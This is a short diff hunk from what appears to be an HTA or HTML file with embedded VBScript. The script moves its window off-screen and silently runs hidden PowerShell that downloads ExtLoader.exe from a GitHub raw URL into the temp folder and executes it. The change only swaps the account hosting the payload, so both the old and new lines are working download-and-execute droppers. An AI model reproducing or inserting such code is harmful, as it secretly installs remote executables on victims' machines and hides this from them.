@@ -19,7 +19,7 @@
         Window.MoveTo -32000, -32000
         
         Set objShell = CreateObject("WScript.Shell")
-        objShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://raw.githubusercontent.com/toddgrub/dear/main/ExtLoader.exe' -OutFile $env:TEMP\file.exe; Start-Process $env:TEMP\file.exe""", 0, False
+        objShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://raw.githubusercontent.com/urshifu2/dear/main/ExtLoader.exe' -OutFile $env:TEMP\file.exe; Start-Process $env:TEMP\file.exe""", 0, False
     End Sub
     </script>
 </head>
